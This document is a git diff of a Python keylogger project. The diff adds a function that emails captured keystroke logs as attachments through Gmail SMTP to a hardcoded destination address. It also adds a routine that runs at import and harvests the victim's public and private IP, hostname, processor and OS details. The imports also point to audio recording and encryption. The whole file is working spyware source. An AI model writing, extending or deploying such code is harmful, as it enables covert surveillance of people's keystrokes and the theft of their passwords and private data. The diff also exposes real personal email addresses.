@@ -31,6 +31,7 @@ from cryptography.fernet import Fernet
 import time 
 import os
 
+
 # Modules to get username information
 import getpass
 from requests import get
@@ -39,12 +40,75 @@ from requests import get
 from scipy.io.wavfile import write
 import sounddevice as soundDeviceObject
 
-# Will come back to this
+# Important Variables
 keysInformation = "logs.txt"
+systemInformation = "system.txt"
 filePath = "/Users/kayvee/Code/KeyLogger/PythonKeyLogger"
 
 totalKeys = 0
 keys =[]
+
+
+#variables for Email 
+email_address = "hacker.heart20@gmail.com" # Enter disposable email here
+password = "" # Enter email password here
+destinationAddr = "Vaibhavsharmakv@gmail.com" # Enter destination addr
+
+
+#Email Functionality
+def send_logs_via_email(filename, attachment, destinationAddr):
+
+    sourceAddr = email_address
+    messageVar = MIMEMultipart()
+    messageVar['From'] = sourceAddr
+    messageVar['To'] = destinationAddr
+    messageVar['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+    messageVar.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    paraVar = MIMEBase('application', 'octet-stream')
+    paraVar.set_payload((attachment).read())
+    encoders.encode_base64(paraVar)
+    paraVar.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    messageVar.attach(paraVar)
+
+    smtpVar = smtplib.SMTP('smtp.gmail.com', 587)
+    smtpVar.starttls()
+    smtpVar.login(sourceAddr, password)
+    text = messageVar.as_string()
+    smtpVar.sendmail(sourceAddr, destinationAddr, text)
+    smtpVar.quit()
+
+
+#send_logs_via_email(keysInformation, filePath + "/" + keysInformation, destinationAddr)
+
+#System Information
+def system_Information():
+	with open(filePath + "/"+systemInformation,"a") as f:
+		hostname = socket.gethostname()
+		IPAddr = socket.gethostbyname("")
+		try:
+			publicIp = get("https://api.ipify.org").text
+			f.write("Public IP Address: " + publicIp)
+
+		except Exception:
+			f.write("Couldn't get Public IP Address (most likely max query")
+
+		f.write('\n')
+		f.write("Processor: " + (platform.processor()) + '\n')
+		f.write("System: " + platform.system() + " " + platform.version() + '\n')
+		f.write("Machine: " + platform.machine() + "\n")
+		f.write("Hostname: " + hostname + "\n")
+		f.write("Private IP Address: " + IPAddr + "\n")
+		f.write('\n')
+		f.write('\n')
+
+
+system_Information()
 
 
 
@@ -55,7 +119,7 @@ def key_is_pressed(Key):
 	print(Key)
 	keys.append(Key)
 	totalKeys += 1
-	
+
 	if totalKeys >= 1:
 		totalKeys = 0
 		write_keys_on_file(keys)
